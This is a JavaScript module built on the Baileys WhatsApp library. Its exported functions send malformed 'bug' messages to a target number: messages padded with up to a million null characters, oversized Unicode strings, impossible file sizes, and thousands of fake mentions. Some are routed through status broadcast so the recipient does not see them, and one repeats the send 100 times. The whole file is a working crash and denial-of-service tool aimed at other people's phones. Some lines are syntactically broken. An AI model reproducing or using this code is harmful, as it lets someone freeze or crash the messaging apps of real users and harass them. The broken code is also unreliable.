const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");
const crypto = require('crypto')
let prim;

async function VisibleX(target) {
  const msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "Ω",
      contentText: "P?r?i?m?e? ? k?ll��r ? K?e?n?t? ¿?",
      footerText: "?�Уңɦ���? k???��r ??����?? ¿?",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " P?r?i?m?e? ? k?ll��r ? K?e?n?t? ¿? " + "\u0000".repeat(500000)
          },
          type: 1
        }
      ],
      headerType: 1
    }
  }, {})

  await prim.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  })
}
  
  
// Invisible
async function InVisibleX(target, show = true) {
  let msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "Ω",
      contentText: "P?r?i?m?e? ? k?ll��r ? K?e?n?t? ¿?",
      footerText: "?�Уңɦ���? k???��r ??����??¿?",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " P?r?i?m?e? ? k?ll��r ? K?e?n?t? ¿? " + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (show) {
    await prim.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "By P?r?i?m?e? ? k?ll��r ? K?e?n?t?",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

// Visible
async function CVisible(target) {
  await prim.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "P?r?i?m?e? ? k?ll��r ? K?e?n?t? ¿?",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

// Invisible
async function CInVisible(target, show = true) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "P?r?i?m?e? ? k?ll��r ? K?e?n?t? ¿?",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {}
  )

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  })

  if (show) {
    await prim.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "Yy",
            },
            content: undefined,
          },
        ],
      }
    )
  }
}
async function docthumb(prim, target) {
  const pnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "�?" + "\u0000".repeat(7500) + "꧀".repeat(55000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1073741824000000",
              pageCount: 9007199254740991 * 9999,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "�?" + "꧀".repeat(1000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "?? Kent".repeat(60000)
          },
          contextInfo: {
            remoteJid: "X",
            participant: target,
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from(
              { length: 1990 },
              () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
              ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
              }
            },
          },
          nativeFlowMessage: {
            messageParamsJson: "{]".repeat(10000),
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "�?" + "꧀".repeat(9999),
                  "flow_message_version": "3"
                })
              },
            ]
          }
        }
      }
    },
    participant: { jid: target }
  };

  const pnxMessage = generateWAMessageFromContent(
    target,
    proto.Message.fromObject(pnx),
    {
      userJid: target
    }
  );
  await prim.relayMessage(
    target,
    pnxMessage.message,
    {
      messageId: pnxMessage.key.id
    }
  );
}

async function glxFrcVisible(prim, target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {},
          body: {
            text: "P?r?i?m?e? ? k?ll��r ? K?e?n?t? ¿?",
            format: "EXTENSION_1" // "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: JSON.stringify({ flow_cta: "\u9999".repeat(90000) }),
            version: 3
          }
        }
      },
      {}
    );
    await prim.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (e) {
    console.error("error:", e);
  }
}

async function glxFrcInvisible(prim, target) {
  try {
    for (let i = 0; i < 100; i++) {
      const msg = await generateWAMessageFromContent(
        target,
        {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: "Primekiller ¿?",
              format: "EXTENSION_1"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({ flow_cta: "\u9999".repeat(90000) }),
              version: 3
            }
          }
        },
        {}
      );

      await prim.relayMessage(
        target,
        {
          groupStatusMessageV2: {
            message: msg.message
          }
        },
        { participant: { jid: target } }
      );
    }
  } catch (e) {
    console.error("error:", e);
  }
}

async function InVisibleIOS(prim, target, show = true) {
        const msg = {
                message: {
                        locationMessage: {
                                degreesLatitude: 21.1266,
                                degreesLongitude: -11.8199,
                                name: "ᎲᎲᎲᎲᎲᎲ" 
                             ".repeat(60000),
                                url: "https://t.me/Handsome_primis_killer_kent",
                                contextInfo: {
                                        externalAdReply: {
                                                quotedAd: {
                                                        advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                                                        mediaType: "IMAGE",
                                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                                        caption: "We bug and destroy." 
                                                        + "𑇂𑆵𑆴𑆿".repeat(60000)
                                                },
                                                placeholderKey: {
                                                        remoteJid: "0s.whatsapp.net",
                                                        fromMe: false,
                                                        id: "ABCDEF1234567890"
                                                }
                                        }
                                }
                        }
                }
        };
  
        await prim.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key?.id || "",
                statusJidList: [target],
                additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target } }]
                        }]
                }]
        });

        if (show) {
                await prim.relayMessage(target, {
                        groupStatusMentionMessage: {
                                message: {
                                        protocolMessage: { key: msg.key, type: 25 }
                                }
                        }
                }, {
                        additionalNodes: [{
                                tag: "meta",
                                attrs: { is_status_mention: "ᎲᎲ" }
                        }]
                });
        }

        console.log(`Succes Send Bug? `);
        await new Promise(resolve => setTimeout(resolve, 9000));
}     

module.exports { VisibleX, InVisibleX, CVisible, CInVisible, docthumb, glxFrcVisible, glxFrcInvisible, InVisibleIOS }